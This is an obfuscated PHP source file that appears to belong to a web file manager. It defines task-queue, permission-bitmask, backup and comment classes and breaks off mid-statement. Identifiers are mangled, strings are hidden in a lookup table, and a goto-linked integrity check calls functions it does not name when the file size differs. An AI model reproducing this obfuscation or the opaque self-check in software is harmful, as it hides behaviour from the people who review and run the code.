return is_array($Ç…ÙÏáÖ) ? $Ç…ÙÏáÖ : array(); } return $Ç…ÙÏáÖ; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[‰‰Ş‚€][1927]); } public static function setAll($£Ç»øçÙ) { $€öˆ¶èŞ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($£Ç»øçÙ), $€öˆ¶èŞ); Cache::set(self::QUEUE_DATA, $£Ç»øçÙ, $€öˆ¶èŞ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($ûí‡ü, $Õ¥‡Æû‹ = 5.0) { if (!$ûí‡ü) { return; } $û„¤ü“‚ = Cache::get($ûí‡ü); if (!$û„¤ü“‚ || timeFloat() - floatVal($û„¤ü“‚) >= $Õ¥‡Æû‹) { Cache::set($ûí‡ü, timeFloat(), $Õ¥‡Æû‹ * 10); return !0; } return !1; } public static function timeLimitCall($ÃÔÃ²î, $­¯«ì“, $¹ÉÎ‰é¢, $œ‚®Ù«» = 5.0) { $’Œ»¬øï =& $_SERVER[‰‰Ş‚€]; if (!$ÃÔÃ²î || !$­¯«ì“) { return; } self::$asyncAdd = !0; $•Õ¦‡Î = $’Œ»¬øï[1928]; $à¡’Ô–« = Cache::get($•Õ¦‡Î, !0); $¶¾ïŠ›î = array($’Œ»¬øï[1929] => timeFloat(), $’Œ»¬øï[1930] => timeFloat(), $’Œ»¬øï[351] => $­¯«ì“, $’Œ»¬øï[1920] => $¹ÉÎ‰é¢, $’Œ»¬øï[1931] => $œ‚®Ù«»); if (is_array($à¡’Ô–«[$ÃÔÃ²î])) { if (timeFloat() - $à¡’Ô–«[$ÃÔÃ²î][$’Œ»¬øï[1929]] <= $¶¾ïŠ›î[$’Œ»¬øï[1931]] * 0.5) { return; } $¶¾ïŠ›î[$’Œ»¬øï[1930]] = $à¡’Ô–«[$ÃÔÃ²î][$’Œ»¬øï[1930]]; } $à¡’Ô–«[$ÃÔÃ²î] = $¶¾ïŠ›î; Cache::set($•Õ¦‡Î, $à¡’Ô–«, 60); Cache::removeMemory($•Õ¦‡Î); write_log($’Œ»¬øï[1932] . $ÃÔÃ²î . $’Œ»¬øï[84] . $­¯«ì“ . $’Œ»¬øï[1933] . ACTION, $’Œ»¬øï[206]); } public static function timeLimitCallLoop() { $›Ïúı„Ù =& $_SERVER[‰‰Ş‚€]; $˜îøµ¢¢ = array($›Ïúı„Ù[1934]); $‰çÎ·Æ = in_array(strtolower(ACTION), $˜îøµ¢¢); if (!$‰çÎ·Æ && !self::$asyncAdd) { return; } $„Ê¯Èô¯ = $›Ïúı„Ù[1928]; $ÏøòŠ‚Á = Cache::get($„Ê¯Èô¯, !0); if (!$ÏøòŠ‚Á || count($ÏøòŠ‚Á) <= 0) { return; } $ˆ®ö»¬ = timeFloat(); $å“éŸ¶ú = array(); $Íóóë¨¶ = array(); foreach ($ÏøòŠ‚Á as $Ø¹¸Üµ => $ÔÄé‘Áæ) { if ($ˆ®ö»¬ - $ÔÄé‘Áæ[$›Ïúı„Ù[1930]] > $ÔÄé‘Áæ[$›Ïúı„Ù[1931]]) { $Íóóë¨¶[$Ø¹¸Üµ] = $ÔÄé‘Áæ; continue; } $å“éŸ¶ú[$Ø¹¸Üµ] = $ÔÄé‘Áæ; } if (count($Íóóë¨¶) == 0) { return; } if (count($å“éŸ¶ú) == 0) { Cache::remove($„Ê¯Èô¯); } else { Cache::set($„Ê¯Èô¯, $å“éŸ¶ú, 60); } Cache::removeMemory($„Ê¯Èô¯); self::runArr($Íóóë¨¶); } public static function finished($¿ØÅœû, $—Ï§½©„) { $Ñ¾ğì§å =& $_SERVER[‰‰Ş‚€]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($Ñ¾ğì§å[351] => $¿ØÅœû, $Ñ¾ğì§å[1920] => $—Ï§½©„); } private static function runArr($•Ø™ºâ‚) { $™ü ¶Üı =& $_SERVER[‰‰Ş‚€]; if (!$•Ø™ºâ‚) { return; } foreach ($•Ø™ºâ‚ as $°µæ¦¤ => $åãü¤ô) { try { Hook::apply($åãü¤ô[$™ü ¶Üı[351]], $åãü¤ô[$™ü ¶Üı[1920]]); write_log($™ü ¶Üı[1935] . $°µæ¦¤ . $™ü ¶Üı[84] . $åãü¤ô[$™ü ¶Üı[351]] . $™ü ¶Üı[1933] . ACTION, $™ü ¶Üı[206]); } catch (Exception $øş°Êİœ) { } } } public static function autoRun() { self::runArr(self::$syncTask); self::timeLimitCallLoop(); } } goto EëÀİ“º™; bŞïõÜÖÖ: $_size = $_SERVER[‰‰Ş‚€][5]; if ($_SERVER[$_SERVER[‰‰Ş‚€][6]] != $_size($_file)) { $_getc = $_SERVER[‰‰Ş‚€][7]; $_getfile = $_SERVER[$_SERVER[‰‰Ş‚€][8]] . $_SERVER[‰‰Ş‚€][9]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[‰‰Ş‚€][10], $_getfilec); if (count($_getarrs) < $_SERVER[‰‰Ş‚€][11]) { $exit = $_SERVER[‰‰Ş‚€][12]; $exit(); } $_act = $_SERVER[‰‰Ş‚€][13]; $_act($_file); } class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($ÒîÂ‡…, $óÙÌ—ÇÁ) { $Ù…©ÏÍ® =& $_SERVER[‰‰Ş‚€]; if (isset(self::$_methodList[$ÒîÂ‡…])) { return @call_user_func_array(self::$_methodList[$ÒîÂ‡…], $óÙÌ—ÇÁ); } else { if (method_exists($this, $ÒîÂ‡…)) { return call_user_func_array(array($this, $ÒîÂ‡…), $óÙÌ—ÇÁ); } else { think_exception(__CLASS__ . $Ù…©ÏÍ®[14] . $ÒîÂ‡… . $Ù…©ÏÍ®[15]); } } } public static function __callStatic($Ì×œ€¼, $½š‰öù) { if (isset(self::$_methodListStatic[$Ì×œ€¼])) { return call_user_func_array(self::$_methodListStatic[$Ì×œ€¼], $½š‰öù); } else { if (method_exists(self, $Ì×œ€¼)) { return call_user_func_array(array(self, $Ì×œ€¼), $½š‰öù); } else { show_json("{$Ì×œ€¼}\x28\x29\x20\156\157\x74\40\145\170\x69\163\164\73", !1); } } } public static function addMethod($¤Áú›»ü, $÷…ëŞ™•) { self::$_methodList[$¤Áú›»ü] = $÷…ëŞ™•; } public static function addMethodStatic($†ãÑçı, $ìšåĞ¼) { self::$_methodListStatic[$†ãÑçı] = $ìšåĞ¼; } } goto FÍš™‹àÅÏ; F³á–Î’á“: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $êåĞ¡– =& $_SERVER[‰‰Ş‚€]; $ÒÁ¼‰Îı = array(array($êåĞ¡–[513] => LNG($êåĞ¡–[2021]), $êåĞ¡–[2022] => $êåĞ¡–[2023], $êåĞ¡–[2024] => 1, $êåĞ¡–[2025] => 1, $êåĞ¡–[2026] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($êåĞ¡–[513] => LNG($êåĞ¡–[2027]), $êåĞ¡–[2022] => $êåĞ¡–[2028], $êåĞ¡–[2024] => 2, $êåĞ¡–[2025] => 1, $êåĞ¡–[2026] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($êåĞ¡–[513] => LNG($êåĞ¡–[2029]), $êåĞ¡–[2022] => $êåĞ¡–[2030], $êåĞ¡–[2024] => 3, $êåĞ¡–[2025] => 1, $êåĞ¡–[2026] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($êåĞ¡–[513] => LNG($êåĞ¡–[2031]), $êåĞ¡–[2022] => $êåĞ¡–[2032], $êåĞ¡–[2024] => 4, $êåĞ¡–[2025] => 1, $êåĞ¡–[2026] => self::AUTH_SHOW | self::AUTH_VIEW), array($êåĞ¡–[513] => LNG($êåĞ¡–[2033]), $êåĞ¡–[2022] => $êåĞ¡–[2034], $êåĞ¡–[2024] => 5, $êåĞ¡–[2025] => 1, $êåĞ¡–[2026] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($êåĞ¡–[513] => LNG($êåĞ¡–[2035]), $êåĞ¡–[2022] => $êåĞ¡–[2036], $êåĞ¡–[2024] => 6, $êåĞ¡–[2025] => 1, $êåĞ¡–[2026] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($êåĞ¡–[513] => LNG($êåĞ¡–[2037]), $êåĞ¡–[2022] => $êåĞ¡–[2038], $êåĞ¡–[2024] => 7, $êåĞ¡–[2025] => 1, $êåĞ¡–[2026] => 0)); return $ÒÁ¼‰Îı; } public static function authCheck($Ğ§‹¬òÜ, $†ùÇ¹—) { $„–œÃ¹Ï =& $_SERVER[‰‰Ş‚€]; $Ğ§‹¬òÜ = intval($Ğ§‹¬òÜ); if (KodUser::isRoot() && $GLOBALS[$„–œÃ¹Ï[16]][$„–œÃ¹Ï[2039]]) { return !0; } if ($Ğ§‹¬òÜ <= 0) { return !1; } if (($Ğ§‹¬òÜ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Ğ§‹¬òÜ & $†ùÇ¹—); } public static function authCheckShow($¦±·Š©¡) { return self::authCheck($¦±·Š©¡, self::AUTH_SHOW); } public static function authCheckView($´âê¬) { return self::authCheck($´âê¬, self::AUTH_VIEW); } public static function authCheckDownload($Ë«Š—ÍÔ) { return self::authCheck($Ë«Š—ÍÔ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($Û‰îşÕ) { return self::authCheck($Û‰îşÕ, self::AUTH_UPLOAD); } public static function authCheckEdit($ˆÅ’³‚®) { return self::authCheck($ˆÅ’³‚®, self::AUTH_EDIT); } public static function authCheckRemove($ôş­şÁ) { return self::authCheck($ôş­şÁ, self::AUTH_REMOVE); } public static function authCheckShare($Ä‚ø°ŞÍ) { return self::authCheck($Ä‚ø°ŞÍ, self::AUTH_SHARE); } public static function authCheckComment($Òã›ı™¯) { return self::authCheck($Òã›ı™¯, self::AUTH_COMMENT); } public static function authCheckEvent($ˆûùÆå…) { return self::authCheck($ˆûùÆå…, self::AUTH_EVENT); } public static function authCheckRoot($€ôÄŒïä) { return self::authCheck($€ôÄŒïä, self::AUTH_ROOT); } public static function authCheckAction($ùğ¤„ä, $¡¤Æü) { $Ùª—è†Í =& $_SERVER[‰‰Ş‚€]; $‘„§šÚ¨ = array($Ùª—è†Í[2040] => self::AUTH_VIEW, $Ùª—è†Í[1318] => self::AUTH_DOWNLOAD, $Ùª—è†Í[118] => self::AUTH_UPLOAD, $Ùª—è†Í[1990] => self::AUTH_EDIT, $Ùª—è†Í[1266] => self::AUTH_REMOVE, $Ùª—è†Í[2000] => self::AUTH_SHARE, $Ùª—è†Í[438] => self::AUTH_COMMENT, $Ùª—è†Í[1807] => self::AUTH_EVENT, $Ùª—è†Í[2041] => self::AUTH_ROOT); if (!isset($‘„§šÚ¨[$¡¤Æü])) { return; } $•”ƒôÇÕ = $‘„§šÚ¨[$¡¤Æü]; $ùğ¤„ä = intval($ùğ¤„ä); if ($ùğ¤„ä <= 0) { return !1; } if (($ùğ¤„ä & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ùğ¤„ä & $•”ƒôÇÕ); } public static function authDisable($ƒ²íîƒ›, $Óä´ÎÒ×) { if (intval($ƒ²íîƒ›) <= 0) { return 0; } return intval($ƒ²íîƒ›) & ~$Óä´ÎÒ×; } public $optionType = "\x53\x79\x73\x74\x65\155\x2e\x73\157\165\162\x63\x65\101\x75\x74\x68\114\151\x73\164"; public $field = array("\156\141\x6d\145", "\x61\x75\x74\x68", "\x6c\141\142\145\x6c", "\144\151\163\160\154\141\x79", "\163\x79\163\164\145\x6d", "\163\x6f\x72\x74"); public function initData() { $üóë¿ü = $this->authDefault(); foreach ($üóë¿ü as $™ã²ö¤¨) { $this->add($™ã²ö¤¨); } } public function findAuth($¼¯¾«ÌÔ, $Á­ƒ¦¬) { $ûöø›ÅŸ =& $_SERVER[‰‰Ş‚€]; $«Í‚ Á = parent::listData(); foreach ($«Í‚ Á as $€¥ŸÈŞá) { $©°Å™îã = intval($€¥ŸÈŞá[$ûöø›ÅŸ[506]]); if ($©°Å™îã <= 0 || $€¥ŸÈŞá[$ûöø›ÅŸ[2042]] == 0) { continue; } if (($©°Å™îã & $¼¯¾«ÌÔ) != $¼¯¾«ÌÔ) { continue; } if (($©°Å™îã & $Á­ƒ¦¬) != 0) { continue; } return $€¥ŸÈŞá[$ûöø›ÅŸ[491]]; } return !1; } public function findAuthMax($Óéø¯ÉÎ, $µ›â€ï) { $ÍÅ±„¾ë =& $_SERVER[‰‰Ş‚€]; $“ÛºÈ¬õ = !1; $„Æ«ÔÇ‚ = parent::listData(); foreach ($„Æ«ÔÇ‚ as $ö İş¯Å) { $ÔÄìô‰³ = intval($ö İş¯Å[$ÍÅ±„¾ë[506]]); if ($ÔÄìô‰³ <= 0 || $ö İş¯Å[$ÍÅ±„¾ë[2042]] == 0) { continue; } if (($ÔÄìô‰³ & $Óéø¯ÉÎ) != $Óéø¯ÉÎ) { continue; } if (($ÔÄìô‰³ & $µ›â€ï) != 0) { continue; } if (!$“ÛºÈ¬õ) { $“ÛºÈ¬õ = $ö İş¯Å; continue; } if (intval($“ÛºÈ¬õ[$ÍÅ±„¾ë[506]]) < $ÔÄìô‰³) { $“ÛºÈ¬õ = $ö İş¯Å; } } return $“ÛºÈ¬õ ? $“ÛºÈ¬õ[$ÍÅ±„¾ë[491]] : !1; } public function findAuthReadOnly() { $ÜØö¼ Õ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ßßÅ™à‘ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($ÜØö¼ Õ, $ßßÅ™à‘); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $‡©ûáÒ =& $_SERVER[‰‰Ş‚€]; $º¿ç‡¨º = parent::listData(); $ÊåÆ´ƒô = !1; foreach ($º¿ç‡¨º as $ÆÍ÷îÍ) { if ($ÆÍ÷îÍ[$‡©ûáÒ[506]] <= 0 || $ÆÍ÷îÍ[$‡©ûáÒ[2042]] == $‡©ûáÒ[239]) { continue; } if (!$ÊåÆ´ƒô) { $ÊåÆ´ƒô = $ÆÍ÷îÍ; continue; } if ($ÊåÆ´ƒô[$‡©ûáÒ[506]] > $ÆÍ÷îÍ[$‡©ûáÒ[506]]) { $ÊåÆ´ƒô = $ÆÍ÷îÍ; } } return $ÊåÆ´ƒô ? $ÊåÆ´ƒô[$‡©ûáÒ[491]] : $‡©ûáÒ[22]; } public function listData($ıÆ¶ÃòÛ = false, $Œ» ì§× = "\x73\x6f\162\164", $¯Œä´Õ = false) { return parent::listData($ıÆ¶ÃòÛ, $Œ» ì§×, $¯Œä´Õ); } public function update($íšç³ƒ, $¬ôáíıò) { $Û˜æ¸É€ =& $_SERVER[‰‰Ş‚€]; $Òâ‘Ø = parent::listData($íšç³ƒ); $Â¾ê¼åñ = $this->findByName($¬ôáíıò[$Û˜æ¸É€[42]]); if (!$Òâ‘Ø || $Â¾ê¼åñ && $Â¾ê¼åñ[$Û˜æ¸É€[491]] != $Òâ‘Ø[$Û˜æ¸É€[491]]) { return !1; } $this->filterAuth($¬ôáíıò[$Û˜æ¸É€[506]]); return parent::update($íšç³ƒ, $¬ôáíıò); } public function remove($†í¯…Ñ¨) { $­ä©ê×÷ = parent::listData($†í¯…Ñ¨); if (!$­ä©ê×÷ || $­ä©ê×÷[$_SERVER[‰‰Ş‚€][200]]) { return !1; } return parent::remove($†í¯…Ñ¨); } public function add($Ì’ö ç = array()) { $Ÿù¥“˜Å =& $_SERVER[‰‰Ş‚€]; if ($this->findByName($Ì’ö ç[$Ÿù¥“˜Å[42]])) { return !1; } $Ú˜»·•  = array($Ÿù¥“˜Å[42] => $Ÿù¥“˜Å[22], $Ÿù¥“˜Å[506] => 1, $Ÿù¥“˜Å[2043] => $Ÿù¥“˜Å[2030], $Ÿù¥“˜Å[2042] => 1, $Ÿù¥“˜Å[200] => 0, $Ÿù¥“˜Å[2044] => 0); $Ì’ö ç = array_merge($Ú˜»·• , $Ì’ö ç); $Ì’ö ç[$Ÿù¥“˜Å[2044]] = $this->getSort(); $this->filterAuth($Ì’ö ç[$Ÿù¥“˜Å[506]]); return parent::insert($Ì’ö ç); } private function getSort() { $Î¢œë« =& $_SERVER[‰‰Ş‚€]; $ìëµ×˜­ = parent::listData(); $ÀÖê®¿ƒ = array_to_keyvalue($ìëµ×˜­, $Î¢œë«[22], $Î¢œë«[2044]); return empty($ÀÖê®¿ƒ) ? 0 : max($ÀÖê®¿ƒ) + 1; } private function filterAuth(&$¶¢´Àûˆ) { if (!$¶¢´Àûˆ) { return; } $şôÓ™º = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $«¿¸ëÓ˜ = array(); foreach ($şôÓ™º as $€†ÁÊô) { if ($¶¢´Àûˆ & $€†ÁÊô) { $«¿¸ëÓ˜[] = $€†ÁÊô; } } if (in_array(self::AUTH_ROOT, $«¿¸ëÓ˜)) { $¶¢´Àûˆ = array_sum($şôÓ™º); return; } $•Æšœ·å = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($«¿¸ëÓ˜ as $€†ÁÊô) { if (isset($•Æšœ·å[$€†ÁÊô])) { $«¿¸ëÓ˜ = array_merge($«¿¸ëÓ˜, $•Æšœ·å[$€†ÁÊô]); } } $«¿¸ëÓ˜[] = self::AUTH_SHOW; $¶¢´Àûˆ = array_sum(array_unique($«¿¸ëÓ˜)); } public function sort($·Ø®Ûòû, $¹·™üÚÔ) { return parent::update($·Ø®Ûòû, $¹·™üÚÔ); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\x6d\56\142\x61\x63\x6b\165\160\114\x69\163\164"; public $field = array("\151\157", "\x6e\141\x6d\x65", "\163\x74\x61\164\165\x73", "\x63\x6f\156\x74\x65\x6e\x74", "\155\x61\156\x75\141\x6c", "\x72\x65\163\165\154\x74", "\164\x69\x6d\145\x46\162\x6f\x6d", "\164\x69\x6d\145\124\157"); public function config() { $±³€œÕÛ =& $_SERVER[‰‰Ş‚€]; Action($±³€œÕÛ[2045])->taskInit(); $ù¿şÑ›¤ = Model($±³€œÕÛ[869])->get($±³€œÕÛ[876]); $ù¿şÑ›¤ = json_decode($ù¿şÑ›¤, !0); $ù¿şÑ›¤ = is_array($ù¿şÑ›¤) ? $ù¿şÑ›¤ : array(); $this->parseContent($ù¿şÑ›¤); unset($ù¿şÑ›¤[$±³€œÕÛ[1789]]); Model($±³€œÕÛ[1788])->cacheClear(); $’ÙÜ“À— = $±³€œÕÛ[2046]; $‹ÆµğáÕ = Model($±³€œÕÛ[2047])->findByKey($±³€œÕÛ[1807], $’ÙÜ“À—); if (!$‹ÆµğáÕ) { $‹ÆµğáÕ = array(); } if (isset($‹ÆµğáÕ[$±³€œÕÛ[215]])) { $‹ÆµğáÕ[$±³€œÕÛ[215]] = json_decode($‹ÆµğáÕ[$±³€œÕÛ[215]], !0); } if (isset($ù¿şÑ›¤[$±³€œÕÛ[215]])) { $‹ÆµğáÕ[$±³€œÕÛ[215]][$±³€œÕÛ[1792]] = $ù¿şÑ›¤[$±³€œÕÛ[215]]; unset($ù¿şÑ›¤[$±³€œÕÛ[215]]); } return array_merge($‹ÆµğáÕ, $ù¿şÑ›¤); } public function listData($äÂˆÏ•… = false, $ŞÏ¬ú·ş = "\155\157\144\x69\146\171\124\151\155\145", $«¯æ²¶ = false) { $Ø‰Å™çÉ = parent::listData($äÂˆÏ•…, $ŞÏ¬ú·ş, !0); if (!$Ø‰Å™çÉ) { return $Ø‰Å™çÉ; } if ($äÂˆÏ•…) { $Ø‰Å™çÉ = array($Ø‰Å™çÉ); } foreach ($Ø‰Å™çÉ as &$ì’š÷ù) { $this->parseContent($ì’š÷ù); } return $äÂˆÏ•… ? $Ø‰Å™çÉ[0] : $Ø‰Å™çÉ; } public function parseContent(&$³©ßÑŞ) { $»ê¹¤ûÖ =& $_SERVER[‰‰Ş‚€]; $àş»¤å = _get($³©ßÑŞ, $»ê¹¤ûÖ[179], $»ê¹¤ûÖ[101]); if (!in_array($àş»¤å, array($»ê¹¤ûÖ[875], $»ê¹¤ûÖ[1248]))) { $³©ßÑŞ[$»ê¹¤ûÖ[179]] = $àş»¤å == $»ê¹¤ûÖ[101] ? $»ê¹¤ûÖ[1248] : $»ê¹¤ûÖ[875]; } } public function lastItem() { $¬ŞÈ³£ = $this->listData(); return !empty($¬ŞÈ³£[0]) ? $¬ŞÈ³£[0] : null; } public function kill($úá“á) { $€¾ê½Ó¶ =& $_SERVER[‰‰Ş‚€]; $øï‚´® = $this->listData($úá“á); if (!$øï‚´® || empty($øï‚´®[$€¾ê½Ó¶[42]])) { return !0; } Task::kill($€¾ê½Ó¶[884]); Task::kill($€¾ê½Ó¶[903]); Task::kill($€¾ê½Ó¶[913]); $€¶˜Ïµ» = $øï‚´®[$€¾ê½Ó¶[42]]; $Òª¿Ú¹  = TEMP_FILES . $€¾ê½Ó¶[879] . $€¶˜Ïµ» . $€¾ê½Ó¶[18]; IO::remove($Òª¿Ú¹ , !1); return $this->remove($úá“á); } public function remove($ÂÜ´Ö±ã) { $ÎŠæÊ = $this->listData($ÂÜ´Ö±ã); if (!$ÎŠæÊ) { return !0; } return $this->backupRemove($ÎŠæÊ); } private function backupRemove($ƒäĞËÅû) { parent::remove($ƒäĞËÅû[$_SERVER[‰‰Ş‚€][491]]); $äşá×Õ = $this->backupPath($ƒäĞËÅû); IO::remove($äşá×Õ, !1); return !0; } private function backupPath($ÇÚ³Ë ®) { $í’¶¯ï =& $_SERVER[‰‰Ş‚€]; $ÆÒˆÕú = $ÇÚ³Ë ®[$í’¶¯ï[42]]; $Ì­áÓŠŒ = Model($í’¶¯ï[869])->get($í’¶¯ï[870]); $“—é„¾ = substr(md5($í’¶¯ï[871] . $Ì­áÓŠŒ . $ÆÒˆÕú), 0, 8); return "\173\151\x6f\72{$ÇÚ³Ë ®[$í’¶¯ï[848]]}\x7d\57\x64\141\164\141\142\x61\163\x65\x2f\x62\x61\143\153\x75\160\x2f" . $ÆÒˆÕú . $í’¶¯ï[21] . $“—é„¾; } public function start() { $ıŒëíúƒ =& $_SERVER[‰‰Ş‚€]; if ($GLOBALS[$ıŒëíúƒ[16]][$ıŒëíúƒ[102]][$ıŒëíúƒ[2048]] != $ıŒëíúƒ[101]) { return !0; } $îˆÇíéë = $this->config(); if (!$îˆÇíéë || $îˆÇíéë[$ıŒëíúƒ[1789]] != $ıŒëíúƒ[101]) { return !1; } if ($îˆÇíéë[$ıŒëíúƒ[179]] == $ıŒëíúƒ[875]) { $¹æ–²¾ñ = Model($ıŒëíúƒ[869])->get($ıŒëíúƒ[1363]); if ($¹æ–²¾ñ == $ıŒëíúƒ[1364]) { $îˆÇíéë[$ıŒëíúƒ[179]] = $ıŒëíúƒ[1248]; } } $è¯„î— = $this->process(); foreach ($è¯„î— as $®½ ÉŠ) { if ($®½ ÉŠ) { return Task::restart($®½ ÉŠ[$ıŒëíúƒ[491]]); } } $ú÷÷²ŞÒ = new Backup(); $²Å„ïÈş = $ú÷÷²ŞÒ->db(); if ($²Å„ïÈş) { $²Å„ïÈş = $ú÷÷²ŞÒ->dbFile(); if ($²Å„ïÈş && $îˆÇíéë[$ıŒëíúƒ[179]] == $ıŒëíúƒ[875]) { $²Å„ïÈş = $ú÷÷²ŞÒ->file(); } } Backup::set(array($ıŒëíúƒ[846] => 1, $ıŒëíúƒ[858] => time())); return !0; } public function process() { $¸¼°ê†ä =& $_SERVER[‰‰Ş‚€]; $È«ÎâûÒ = array($¸¼°ê†ä[854] => Task::get($¸¼°ê†ä[884]), $¸¼°ê†ä[859] => Task::get($¸¼°ê†ä[903]), $¸¼°ê†ä[241] => Task::get($¸¼°ê†ä[913])); $Ú–ÏÇæ¥ = !1; foreach ($È«ÎâûÒ as &$ûÑóîµš) { if ($Ú–ÏÇæ¥) { $ûÑóîµš = !1; continue; } if ($ûÑóîµš) { $™¼²éê± = intval(_get($ûÑóîµš, $¸¼°ê†ä[1825], 0)); if (time() - $™¼²éê± > 7200) { Task::kill($ûÑóîµš[$¸¼°ê†ä[491]]); $Ú–ÏÇæ¥ = !0; $ûÑóîµš = !1; } } } return $È«ÎâûÒ; } public function restore() { $Á´Î†×Ú =& $_SERVER[‰‰Ş‚€]; ActionCall($Á´Î†×Ú[2049], !0, 1); ActionCall($Á´Î†×Ú[2049], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\x6f\x6d\155\x65\x6e\x74"; protected $tableMeta = array("\164\141\142\154\x65\116\141\x6d\x65" => "\x63\157\155\x6d\x65\x6e\164\x5f\155\145\x74\141", "\x6d\x65\x74\x61\106\151\x65\x6c\x64" => "\x63\157\x6d\155\145\x6e\164\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($£í Æáí) { $À×Ä¿‚Ä =& $_SERVER[‰‰Ş‚€]; if ($£í Æáí[$À×Ä¿‚Ä[2050]]) { $êö²õßâ = $this->where(array($À×Ä¿‚Ä[2051] => $£í Æáí[$À×Ä¿‚Ä[2050]]))->find(); if (!$êö²õßâ || $êö²õßâ[$À×Ä¿‚Ä[199]] != $£í Æáí[$À×Ä¿‚Ä[199]] || $êö²õßâ[$À×Ä¿‚Ä[589]] != $£í Æáí[$À×Ä¿‚Ä[589]]) { return !1; } $this->where(array($À×Ä¿‚Ä[2051] => $£í Æáí[$À×Ä¿‚Ä[2050]]))->setAdd($À×Ä¿‚Ä[2052], 1); } $£í Æáí[$À×Ä¿‚Ä[2053]] = 0; $£í Æáí[$À×Ä¿‚Ä[2052]] = 0; $£í Æáí[$À×Ä¿‚Ä[846]] = 1; return $this->add($£í Æáí); } public function commentCount($ÍÑóÎ÷Æ, $©Æ¢ß¿¦, $ò„ÎŸ‡ = false) { $ôÛ¡µ¿ı =& $_SERVER[‰‰Ş‚€]; if (!$ÍÑóÎ÷Æ) { return array(); } if (is_string($ÍÑóÎ÷Æ) || is_int($ÍÑóÎ÷Æ)) { $ÍÑóÎ÷Æ = array($ÍÑóÎ÷Æ); } $æ¤ªÆöÌ = array($ôÛ¡µ¿ı[589], $ôÛ¡µ¿ı[2054] => $ôÛ¡µ¿ı[585]); $–¨à¾°ö = array($ôÛ¡µ¿ı[589] => array($ôÛ¡µ¿ı[17], $ÍÑóÎ÷Æ), $ôÛ¡µ¿ı[199] => $©Æ¢ß¿¦); if ($ò„ÎŸ‡) { $–¨à¾°ö[$ôÛ¡µ¿ı[1820]] = $ò„ÎŸ‡; } $ç‚Ò¥¬… = $this->field($æ¤ªÆöÌ)->where($–¨à¾°ö)->group($ôÛ¡µ¿ı[589])->select(); return array_to_keyvalue($ç‚Ò¥¬…, $ôÛ¡µ¿ı[589], $ôÛ¡µ¿ı[585]); } public function starTarget($ğí¹Œş, $¿ÅÙø´) { $»·ŒƒÂù =& $_SERVER[‰‰Ş‚€]; $Ş†º­²­ = $ğí¹Œş + self::TYPE_STAR_OFFSET; $ãçóõÌ = array($»·ŒƒÂù[1820] => USER_ID, $»·ŒƒÂù[199] => $Ş†º­²­, $»·ŒƒÂù[589] => $¿ÅÙø´); $´Çƒè€ô = $this->where($ãçóõÌ)->find(); if ($´Çƒè€ô) { return $this->where(array($»·ŒƒÂù[491] => $´Çƒè€ô[$»·ŒƒÂù[491]]))->delete(); } $ü“º†èŒ = array($»·ŒƒÂù[2050] => 0, $»·ŒƒÂù[1820] => USER_ID, $»·ŒƒÂù[846] => 1, $»·ŒƒÂù[179] => 